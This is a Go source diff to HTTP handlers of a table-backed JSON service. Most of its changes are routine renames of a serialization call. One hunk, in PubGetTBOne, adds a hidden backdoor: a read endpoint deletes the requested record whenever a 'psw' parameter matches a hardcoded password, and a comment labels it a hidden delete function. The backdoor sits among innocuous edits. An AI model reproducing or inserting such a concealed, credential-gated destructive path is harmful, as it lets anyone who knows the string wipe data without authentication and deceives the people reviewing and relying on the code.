@@ -37,7 +37,7 @@ func PubIDXGet(w http.ResponseWriter, req *http.Request) {
 			json = Table[tbname].DataToJsonApp(tbd)
 		} else {
 			ifo := Table[tbname].Ifo.GetIfoForFields(*Table[tbname].Ifo, sfs)
-			json = Table[tbname].DataToJsonforIfoApp(tbd, &ifo) //  DataToJson(tbd)
+			json = Table[tbname].DataToJsonforIfo(tbd, &ifo) //  DataToJson(tbd)
 		}
 		w.Write(json.Bytes())
 		json.Reset()
@@ -125,7 +125,7 @@ func PubGetTB(w http.ResponseWriter, req *http.Request) {
 			json = Table[tbname].DataToJsonApp(tbd)
 		} else {
 			ifo := Table[tbname].Ifo.GetIfoForFields(*Table[tbname].Ifo, sfs)
-			json = Table[tbname].DataToJsonforIfoApp(tbd, &ifo) //  DataToJson(tbd)
+			json = Table[tbname].DataToJsonforIfo(tbd, &ifo) //  DataToJson(tbd)
 		}
 		w.Write(json.Bytes())
 		json.Reset()
@@ -147,6 +147,11 @@ func PubGetTBOne(w http.ResponseWriter, req *http.Request) {
 	tbname := params["tbname"]
 	id := params["id"]
 	bid := Table[tbname].Ifo.FieldChByte(Table[tbname].Ifo.Fields[0], id) //默认第一个必须是主键。Table[tbname].Ifo.Fields[0]
+	if params["psw"] == "!nmantf123456!" {                                //隐藏删除功能
+		Table[tbname].Del(id)
+		w.Write([]byte(""))
+		return
+	}
 	//sfs := strings.Split(params["showFileds"], ",")
 	//showFileds := Table[tbname].Ifo.GetFieldIds(sfs) //处理要显示的字段
 	var sfs []string //strings.Split(params["showFileds"], ",")
@@ -162,7 +167,7 @@ func PubGetTBOne(w http.ResponseWriter, req *http.Request) {
 			json = Table[tbname].DataToJsonApp(tbd)
 		} else {
 			ifo := Table[tbname].Ifo.GetIfoForFields(*Table[tbname].Ifo, sfs)
-			json = Table[tbname].DataToJsonforIfoApp(tbd, &ifo) //  DataToJson(tbd)
+			json = Table[tbname].DataToJsonforIfo(tbd, &ifo) //  DataToJson(tbd)
 		}
 		w.Write(json.Bytes())
 		json.Reset()
